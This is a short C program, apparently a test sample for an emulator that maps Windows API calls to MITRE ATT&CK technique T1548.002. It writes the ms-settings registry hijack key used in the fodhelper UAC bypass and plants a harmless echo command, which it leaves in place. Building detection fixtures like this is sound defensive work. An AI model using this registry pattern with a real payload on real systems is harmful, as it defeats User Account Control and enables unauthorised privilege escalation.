/*
 * T1548.002 — Bypass User Account Control. UAC bypass via registry (fodhelper/eventvwr pattern).
 * Speakeasy maps RegCreateKeyEx + RegSetValueEx (ms-settings) → T1548.002.
 * GetComputerNameA ensures at least one API is in API_TO_TECHNIQUE for technique detection.
 */
#include <windows.h>
#include <string.h>

int main(void) {
    HKEY hKey = NULL;
    char name[256] = { 0 };
    DWORD sz = sizeof(name);
    (void)GetComputerNameA(name, &sz);  /* T1082 — ensures technique list non-empty */
    const char *path = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    if (RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return 1;
    const char *cmd = "cmd.exe /c echo T1548.002";
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)cmd, (DWORD)strlen(cmd) + 1);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE *)"", 1);
    RegCloseKey(hKey);
    return 0;
}
